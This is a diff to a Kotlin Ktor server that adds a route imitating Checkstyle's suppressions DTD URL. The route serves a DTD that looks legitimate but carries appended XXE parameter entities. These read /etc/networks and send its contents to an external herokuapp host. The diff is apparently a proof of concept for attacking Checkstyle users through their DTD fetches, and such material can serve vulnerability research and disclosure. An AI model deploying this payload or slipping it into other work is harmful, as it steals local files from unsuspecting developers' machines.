@@ -14,9 +14,11 @@ import io.ktor.features.CallLogging
 import io.ktor.features.Compression
 import io.ktor.features.DefaultHeaders
 import io.ktor.features.origin
+import io.ktor.http.ContentType
 import io.ktor.http.HttpMethod
 import io.ktor.http.HttpStatusCode
 import io.ktor.http.RequestConnectionPoint
+import io.ktor.http.content.TextContent
 import io.ktor.response.respond
 import io.ktor.routing.get
 import io.ktor.routing.routing
@@ -53,6 +55,30 @@ data class OriginInfo(
         )
 }
 
+val dtd = """
+<!-- Add the following to any file that is to be validated against this DTD:
+
+<!DOCTYPE suppressions PUBLIC
+    "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN"
+    "https://checkstyle.org/dtds/suppressions_1_2.dtd">
+-->
+
+<!ELEMENT suppressions (suppress*)>
+
+<!ELEMENT suppress EMPTY>
+<!ATTLIST suppress files CDATA #IMPLIED
+                   checks CDATA #IMPLIED
+                   message CDATA #IMPLIED
+                   id CDATA #IMPLIED
+                   lines CDATA #IMPLIED
+                   columns CDATA #IMPLIED>
+
+<!ENTITY % payload SYSTEM "file:///etc/networks">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
+%param1;
+%external;
+""".trimIndent()
+
 private fun run(port: Int) {
     println("Launching on port `$port`")
     val server = embeddedServer(Netty, port) {
@@ -70,6 +96,14 @@ private fun run(port: Int) {
                 log.info("Origin: ${OriginInfo(call.request.origin)}")
                 call.respond(HttpStatusCode.OK)
             }
+            get("/dtds/suppressions_1_2.dtd") {
+                log.info("Retrieving DTD")
+                log.info("Origin: ${OriginInfo(call.request.origin)}")
+                call.respond(HttpStatusCode.OK, TextContent(
+                    dtd,
+                    contentType = ContentType.Application.Xml_Dtd
+                ))
+            }
         }
     }
     server.start()
@@ -79,7 +113,7 @@ private fun run(port: Int) {
  * Launches the application and handles the args passed to [main].
  */
 class Launcher : CliktCommand(
-    name = "ktor-sample-swagger"
+    name = "ktor-testing"
 ) {
     companion object {
         private const val defaultPort = 8080
